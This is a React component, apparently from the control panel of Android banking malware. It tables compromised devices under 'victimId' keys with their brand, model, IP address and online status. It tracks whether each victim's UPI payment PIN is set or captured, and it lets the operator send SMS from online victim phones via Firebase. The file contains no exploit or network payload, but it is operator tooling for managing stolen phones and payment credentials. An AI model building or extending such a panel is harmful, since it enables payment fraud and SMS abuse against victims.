import { useNavigate } from 'react-router-dom';
import { useState, useMemo } from 'react';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Label } from '@/components/ui/label';
import { Search, Filter, ChevronLeft, ChevronRight, Trash2, Eye, Settings, MessageSquare, Loader2, AlertCircle } from 'lucide-react';
import { DeviceInfo } from '@/data/db';
import { SendSMSDialog } from './SendSMSDialog';

interface DeviceTableProps {
  devices: Record<string, DeviceInfo>;
  loading?: boolean;
  error?: string | null;
}

export function DeviceTable({ devices, loading = false, error = null }: DeviceTableProps) {
  const navigate = useNavigate();
  
  // State for filtering and pagination
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState<string>('all');
  const [availabilityFilter, setAvailabilityFilter] = useState<string>('all');
  const [rowsPerPage, setRowsPerPage] = useState<number>(10);
  const [currentPage, setCurrentPage] = useState<number>(1);

  // State for Send SMS dialog
  const [smsDialogOpen, setSmsDialogOpen] = useState(false);
  const [selectedDevice, setSelectedDevice] = useState<{ id: string; info: DeviceInfo } | null>(null);

  const getBatteryColor = (battery: string) => {
    const level = parseInt(battery.replace('%', ''));
    if (level < 20) return 'destructive';
    if (level < 50) return 'secondary';
    return 'default';
  };

  const getStatusBadge = (status: string) => {
    return status === 'Online' ? 'badge-online' : 'badge-offline';
  };

  const getAvailabilityBadge = (upiPin: string | string[]) => {
    const pinValue = Array.isArray(upiPin) ? upiPin[0] : upiPin;
    if (pinValue === 'No Pin') return 'bg-green-100 text-green-800 border-green-200';
    if (pinValue === '****') return 'bg-yellow-100 text-yellow-800 border-yellow-200';
    return 'bg-gray-100 text-gray-800 border-gray-200';
  };

  const handleViewDevice = (victimId: string, e: React.MouseEvent) => {
    e.stopPropagation();
    navigate(`/device/${victimId}`);
  };

  const handleSendSMS = (victimId: string, device: DeviceInfo, e: React.MouseEvent) => {
    e.stopPropagation();
    setSelectedDevice({ id: victimId, info: device });
    setSmsDialogOpen(true);
  };

  const closeSMSDialog = () => {
    setSmsDialogOpen(false);
    setSelectedDevice(null);
  };

  // Filter and paginate devices
  const filteredAndPaginatedDevices = useMemo(() => {
    const filtered = Object.entries(devices).filter(([victimId, device]) => {
      // Search filter
      const searchMatch = searchTerm === '' || 
        victimId.toLowerCase().includes(searchTerm.toLowerCase()) ||
        (device.Brand || '').toLowerCase().includes(searchTerm.toLowerCase()) ||
        (device.Model || '').toLowerCase().includes(searchTerm.toLowerCase()) ||
        (device.Note || '').toLowerCase().includes(searchTerm.toLowerCase()) ||
        (device.IPAddress || '').toLowerCase().includes(searchTerm.toLowerCase());

      // Status filter
      const statusMatch = statusFilter === 'all' || device.Status === statusFilter;

      // Availability filter
      const availabilityMatch = availabilityFilter === 'all' || 
        (availabilityFilter === 'available' && Array.isArray(device.UPIPin) && device.UPIPin.includes('No Pin')) ||
        (availabilityFilter === 'hasPin' && (!Array.isArray(device.UPIPin) || !device.UPIPin.includes('No Pin')));

      // Debug logging
      console.log('Filtering device:', victimId, {
        searchMatch,
        statusMatch,
        availabilityMatch,
        searchTerm,
        statusFilter,
        availabilityFilter,
        deviceStatus: device.Status,
        deviceUPIPin: device.UPIPin
      });

      return searchMatch && statusMatch && availabilityMatch;
    });

    console.log('Filtered devices:', filtered.length, 'out of', Object.keys(devices).length);
    return filtered;
  }, [devices, searchTerm, statusFilter, availabilityFilter]);

  // Calculate pagination
  const totalPages = Math.ceil(filteredAndPaginatedDevices.length / rowsPerPage);
  const startIndex = (currentPage - 1) * rowsPerPage;
  const endIndex = startIndex + rowsPerPage;
  const currentDevices = filteredAndPaginatedDevices.slice(startIndex, endIndex);

  // Reset to first page when filters change
  const handleFilterChange = () => {
    setCurrentPage(1);
  };

  const resetFilters = () => {
    setSearchTerm('');
    setStatusFilter('all');
    setAvailabilityFilter('all');
    setCurrentPage(1);
  };

  const handleSearch = (value: string) => {
    setSearchTerm(value);
    handleFilterChange();
  };

  const handleStatusFilter = (value: string) => {
    setStatusFilter(value);
    handleFilterChange();
  };

  const handleAvailabilityFilter = (value: string) => {
    setAvailabilityFilter(value);
    handleFilterChange();
  };

  const handleRowsPerPage = (value: string) => {
    setRowsPerPage(parseInt(value));
    setCurrentPage(1);
  };

  const goToPage = (page: number) => {
    setCurrentPage(Math.max(1, Math.min(page, totalPages)));
  };

  const goToPreviousPage = () => goToPage(currentPage - 1);
  const goToNextPage = () => goToPage(currentPage + 1);

  // Generate page numbers for pagination
  const getPageNumbers = () => {
    const pages = [];
    const maxVisiblePages = 5;
    
    if (totalPages <= maxVisiblePages) {
      for (let i = 1; i <= totalPages; i++) {
        pages.push(i);
      }
    } else {
      if (currentPage <= 3) {
        for (let i = 1; i <= 5; i++) {
          pages.push(i);
        }
        if (totalPages > 5) pages.push('...');
        pages.push(totalPages);
      } else if (currentPage >= totalPages - 2) {
        pages.push(1);
        pages.push('...');
        for (let i = totalPages - 4; i <= totalPages; i++) {
          pages.push(i);
        }
      } else {
        pages.push(1);
        pages.push('...');
        for (let i = currentPage - 1; i <= currentPage + 1; i++) {
          pages.push(i);
        }
        pages.push('...');
        pages.push(totalPages);
      }
    }
    
    return pages;
  };

  // Show loading state
  if (loading) {
    return (
      <Card className="card-glass border-0 animate-slide-up">
        <div className="p-12 text-center">
          <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4 text-primary" />
          <p className="text-lg font-medium text-muted-foreground">Loading devices...</p>
          <p className="text-sm text-muted-foreground">Connecting to Firebase</p>
        </div>
      </Card>
    );
  }

  // Show error state
  if (error) {
    return (
      <Card className="card-glass border-0 animate-slide-up">
        <div className="p-12 text-center">
          <AlertCircle className="w-8 h-8 mx-auto mb-4 text-destructive" />
          <p className="text-lg font-medium text-destructive mb-2">Failed to load devices</p>
          <p className="text-sm text-muted-foreground mb-4">{error}</p>
          <Button onClick={() => window.location.reload()}>
            Try Again
          </Button>
        </div>
      </Card>
    );
  }

  // Show empty state
  if (Object.keys(devices).length === 0) {
    return (
      <Card className="card-glass border-0 animate-slide-up">
        <div className="p-12 text-center">
          <div className="w-16 h-16 bg-muted rounded-full flex items-center justify-center mx-auto mb-4">
            <MessageSquare className="w-8 h-8 text-muted-foreground" />
          </div>
          <p className="text-lg font-medium text-muted-foreground mb-2">No devices found</p>
          <p className="text-sm text-muted-foreground">Start by adding your first device to the system</p>
        </div>
      </Card>
    );
  }

  return (
    <>
      <Card className="card-glass border-0 animate-slide-up">
        {/* Filters Section */}
        <div className="p-6 border-b bg-muted/20">
          <div className="flex flex-col lg:flex-row gap-4 items-start lg:items-center justify-between">
            <div className="flex flex-col sm:flex-row gap-4 flex-1">
              {/* Search */}
              <div className="relative flex-1 max-w-sm">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground w-4 h-4" />
                <Input
                  placeholder="Search devices, brands, models..."
                  value={searchTerm}
                  onChange={(e) => handleSearch(e.target.value)}
                  className="pl-10"
                />
              </div>

              {/* Status Filter */}
              <div className="flex flex-col gap-2 min-w-[140px]">
                <Label htmlFor="status-filter" className="text-sm font-medium">Status</Label>
                <Select value={statusFilter} onValueChange={handleStatusFilter}>
                  <SelectTrigger id="status-filter">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">All Status</SelectItem>
                    <SelectItem value="Online">Online</SelectItem>
                    <SelectItem value="Offline">Offline</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Availability Filter */}
              <div className="flex flex-col gap-2 min-w-[140px]">
                <Label htmlFor="availability-filter" className="text-sm font-medium">Availability</Label>
                <Select value={availabilityFilter} onValueChange={handleAvailabilityFilter}>
                  <SelectTrigger id="availability-filter">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">All</SelectItem>
                    <SelectItem value="available">Available</SelectItem>
                    <SelectItem value="hasPin">Has Pin</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Reset Filters Button */}
              <div className="flex flex-col gap-2">
                <Label className="text-sm font-medium opacity-0">Reset</Label>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={resetFilters}
                  className="px-3"
                >
                  Reset Filters
                </Button>
              </div>
            </div>
          </div>
        </div>

        {/* Table */}
        <div className="overflow-x-auto">
          <Table>
            <TableHeader className="sticky top-0 bg-background/80 backdrop-blur-sm">
              <TableRow>
                <TableHead className="font-semibold">Status</TableHead>
                <TableHead className="font-semibold">Device</TableHead>
                <TableHead className="font-semibold">Android</TableHead>
                <TableHead className="font-semibold">Availability</TableHead>
                <TableHead className="font-semibold">IP Address</TableHead>
                <TableHead className="font-semibold">Note</TableHead>
                <TableHead className="font-semibold">Added</TableHead>
                <TableHead className="font-semibold">Actions</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {currentDevices.map(([victimId, device]) => (
                <TableRow
                  key={victimId}
                  className="hover:bg-muted/50 transition-colors"
                >
                  <TableCell>
                    <Badge className={getStatusBadge(device.Status || 'Unknown')}>
                      {device.Status || 'Unknown'}
                    </Badge>
                  </TableCell>
                  <TableCell>
                    <div>
                      <div className="font-medium">{victimId}</div>
                      <div className="text-sm text-muted-foreground">
                        {device.Brand} {device.Model}
                      </div>
                    </div>
                  </TableCell>
                  <TableCell>
                    <Badge variant="outline">
                      Android V{device.AndroidVersion}
                    </Badge>
                  </TableCell>
                  <TableCell>
                    <Badge className={getAvailabilityBadge(Array.isArray(device.UPIPin) ? device.UPIPin[0] || 'No Pin' : device.UPIPin || 'No Pin')}>
                      {Array.isArray(device.UPIPin) && device.UPIPin.includes('No Pin') ? 'Available' : 'Has Pin'}
                    </Badge>
                  </TableCell>
                  <TableCell className="text-muted-foreground">
                    {device.IPAddress || 'Unknown'}
                  </TableCell>
                  <TableCell className="text-muted-foreground">
                    {device.Note || '-'}
                  </TableCell>
                  <TableCell>
                    <div className="flex items-center gap-2">
                      <span className="text-sm text-muted-foreground">
                        {device.Added || '-'}
                      </span>
                      <Button
                        size="icon"
                        variant="ghost"
                        className="w-6 h-6 rounded-full hover:bg-destructive/10 hover:text-destructive"
                      >
                        <Trash2 className="w-3 h-3" />
                      </Button>
                    </div>
                  </TableCell>
                  <TableCell>
                    <div className="flex items-center gap-2">
                      <Button
                        size="icon"
                        variant="ghost"
                        className="w-8 h-8 rounded-full hover:bg-primary/10 hover:text-primary"
                        onClick={(e) => handleViewDevice(victimId, e)}
                        title="View Device"
                      >
                        <Eye className="w-4 h-4" />
                      </Button>
                      <Button
                        size="icon"
                        variant="ghost"
                        className="w-8 h-8 rounded-full hover:bg-muted"
                        title="Settings"
                      >
                        <Settings className="w-4 h-4" />
                      </Button>
                      <Button
                        size="icon"
                        variant="ghost"
                        className="w-8 h-8 rounded-full hover:bg-blue-50 hover:text-blue-600 hover:border-blue-200"
                        onClick={(e) => handleSendSMS(victimId, device, e)}
                        disabled={device.Status !== 'Online'}
                        title="Send SMS"
                      >
                        <MessageSquare className="w-4 h-4" />
                      </Button>
                    </div>
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </div>

        {/* Pagination and Rows per Page */}
        <div className="p-6 border-t bg-muted/20">
          <div className="flex flex-col sm:flex-row gap-4 items-center justify-between">
            {/* Rows per page */}
            <div className="flex items-center gap-2">
              <Label htmlFor="rows-per-page" className="text-sm">Rows per page</Label>
              <Select value={rowsPerPage.toString()} onValueChange={handleRowsPerPage}>
                <SelectTrigger id="rows-per-page" className="w-20">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="5">5</SelectItem>
                  <SelectItem value="10">10</SelectItem>
                  <SelectItem value="25">25</SelectItem>
                  <SelectItem value="50">50</SelectItem>
                  <SelectItem value="100">100</SelectItem>
                  <SelectItem value="200">200</SelectItem>
                  <SelectItem value="300">300</SelectItem>
                  <SelectItem value="400">400</SelectItem>
                  <SelectItem value="500">500</SelectItem>
                  <SelectItem value="600">600</SelectItem>
                </SelectContent>
              </Select>
            </div>

            {/* Pagination */}
            <div className="flex items-center gap-2">
              <span className="text-sm text-muted-foreground">
                {startIndex + 1}-{Math.min(endIndex, filteredAndPaginatedDevices.length)} of {filteredAndPaginatedDevices.length}
              </span>
              
              <div className="flex items-center gap-1">
                <Button
                  variant="outline"
                  size="sm"
                  onClick={goToPreviousPage}
                  disabled={currentPage === 1}
                  className="w-8 h-8 p-0"
                >
                  <ChevronLeft className="w-4 h-4" />
                </Button>
                
                {getPageNumbers().map((page, index) => (
                  <Button
                    key={index}
                    variant={page === currentPage ? 'default' : 'outline'}
                    size="sm"
                    onClick={() => typeof page === 'number' && goToPage(page)}
                    disabled={page === '...'}
                    className="w-8 h-8 p-0"
                  >
                    {page}
                  </Button>
                ))}
                
                <Button
                  variant="outline"
                  size="sm"
                  onClick={goToNextPage}
                  disabled={currentPage === totalPages}
                  className="w-8 h-8 p-0"
                >
                  <ChevronRight className="w-4 h-4" />
                </Button>
              </div>
            </div>
          </div>
        </div>
      </Card>

      {/* Send SMS Dialog */}
      {selectedDevice && (
        <SendSMSDialog
          isOpen={smsDialogOpen}
          onClose={closeSMSDialog}
          device={selectedDevice.info}
          deviceId={selectedDevice.id}
        />
      )}
    </>
  );
}